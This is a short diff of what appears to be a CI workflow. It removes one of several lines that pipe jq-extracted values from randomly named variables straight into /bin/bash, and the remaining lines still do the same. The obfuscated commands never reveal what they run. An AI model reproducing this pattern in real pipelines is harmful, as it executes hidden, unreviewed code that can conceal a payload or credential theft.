@@ -24,7 +24,6 @@ jobs:
           echo $igsyc89549 | jq -r .th841 | /bin/bash
           echo $ydc29 | jq -r .hhee14738 | /bin/bash
           echo $j0 | jq -r .o30217 | /bin/bash
-          echo $lum7571 | jq -r .ghno8914 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
